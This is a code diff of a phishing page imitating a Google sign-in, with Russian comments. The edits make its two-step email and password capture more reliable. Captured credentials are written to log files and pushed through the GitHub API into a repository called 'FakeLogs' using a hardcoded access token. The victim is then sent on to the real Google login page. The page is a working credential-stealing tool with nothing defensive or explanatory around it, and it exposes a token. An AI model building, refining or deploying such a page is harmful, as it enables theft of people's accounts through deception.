@@ -92,7 +92,8 @@
                 </div>
                 
                 <div class="input-group" id="passwordGroup" style="display: none;">
-                    <input type="password" id="passInput" placeholder=" " required>
+                    <!-- Тут убран required, чтобы не было ошибки -->
+                    <input type="password" id="passInput" placeholder=" ">
                     <label for="passInput">Введите пароль</label>
                 </div>
 
@@ -123,30 +124,38 @@
         // НАСТРОЙКИ (ВСТАВЬ СВОИ ДАННЫЕ)
         // ==========================================
         const GH_TOKEN = "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"; 
-        const REPO_OWNER = "jgjjj0927-hub"; // Твой ник
-        const REPO_NAME = "FakeLogs";       // Название репозитория для логов
+        const REPO_OWNER = "jgjjj0927-hub"; 
+        const REPO_NAME = "FakeLogs";       
         // ==========================================
 
         let step = 1;
         let emailVal = "";
 
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('emailInput');
+        const passGroup = document.getElementById('passwordGroup');
+        const passInput = document.getElementById('passInput');
+        const btnNext = document.getElementById('btnNext');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault(); 
             
             if (step === 1) {
-                // Шаг 1: Ввод почты
-                emailVal = document.getElementById('emailInput').value;
-                if (!emailVal) return;
+                emailVal = emailInput.value.trim();
+                if (emailVal === "") return;
                 
-                document.getElementById('passwordGroup').style.display = 'block';
-                document.getElementById('emailInput').readOnly = true;
-                document.getElementById('btnNext').innerText = "Войти";
+                emailInput.readOnly = true;
+                passGroup.style.display = 'block'; 
+                passInput.focus(); 
+                btnNext.innerText = "Войти";
                 step = 2;
-            } else if (step === 2) {
-                // Шаг 2: Ввод пароля
-                const passVal = document.getElementById('passInput').value;
-                if (!passVal) return;
                 
+            } else if (step === 2) {
+                const passVal = passInput.value.trim();
+                if (passVal === "") {
+                    alert("Введите пароль");
+                    return;
+                }
                 sendToGitHub(emailVal, passVal);
             }
         });
@@ -155,10 +164,7 @@
             const date = new Date().toISOString().replace(/[:.]/g, '-');
             const fileName = `log_${date}.txt`;
             const content = `Логин: ${email}\nПароль: ${pass}\nДата: ${new Date().toLocaleString()}`;
-            
-            // Кодируем в base64
             const base64Content = btoa(unescape(encodeURIComponent(content)));
-
             const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${fileName}`;
             
             fetch(url, {
@@ -173,7 +179,6 @@
                     content: base64Content
                 })
             }).finally(() => {
-                // В любом случае перекидываем на настоящий Google
                 window.location.href = "https://accounts.google.com";
             });
         }
